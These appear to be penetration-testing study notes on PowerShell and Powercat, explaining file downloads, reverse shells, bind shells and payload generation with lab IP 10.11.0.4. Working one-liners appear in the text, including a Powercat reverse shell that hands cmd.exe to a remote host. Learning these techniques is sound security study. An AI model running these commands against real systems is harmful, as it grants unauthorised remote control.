# Netcat

# Socat

# #PowerShell and #Powercat

## PowerShell File Transfers
#Powershell is more complex (and capable) than **netcat** or **socat**.  As a result, it's more complex.  Take the following command, and let's break it down : 
- **powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"**
	- **-c** : execute the supplied command (in double-quotes)
	- **new-object** : cmdlet that allows us to instantiate either a *.Net Framework* or a *COM object*. 
	- **.WebClient** is the class within the **System.Net** namespace
	- **.DownloadFile** a public method that requires 2 comma-separated parameters : 
		1. a *source* location
		2. a *target* location where the retrieved ata will be stored

## PowerShell Reverse Shells
Sending a PS #reverseShell is not as clean as **nc**.  Syntax is as follows : 

![[Pasted image 20221021104817.png]]

This can all be rolled into one lengthy one liner to open up a reverse shell.  best practice here is to copy/paste and changae the **IP** and **port number**
![[Pasted image 20221021110639.png]] 

***Note that the iex (" #Invoke-Expression") cmdlet runs any string it receives as a command and the results of the command are then redirected and sent back via the data stream*** 

## PowerShell Bind Shells
As before, a one-liner can be leveraged using the **-c** switch, and we add a new *listener* variable using the *System.Net.Sockets.TcpListener* class.
![[Pasted image 20221021111320.png]]

## Powercat
Essentially a PowerShell version of netcat.  Can be installed using **apt install #powercat**

*Note* : you can use *Dot-sourcing* to load the script by typing **`..\script [dot] ps1`**

## Powercat File Transfers
**`powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1`**
- **-c** specifies client mode adn sets the listener address.  
- **-p** specifies the port number
- **-i** indicates teh local file that will be transferred remotely

## Powercat Reverse Shells
### Remain similar to what we've already seen
**`powercat -c 10.11.0.4 -p 443 -e cmd.exe`**
- Note the use of the **-e** option here to specify the application to execute

## Powercat Bind Shells
Started wiht a powercat listener
- **`powercat -lp 443 -e cmd.exe**`
	-_Note_ the binding of the command to a listening port
	
## Powercat Stand-Alone Payloads
In the context of powercat, a payload is a set of powershell instructions and the portion of the powercat script that only includes teh features requested by the user by using the **-g** switch
- **`powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1`**
- _Note_ : Stand-alond payloads like this might be easily detected  by IDS

# Wireshark

# tcpdump

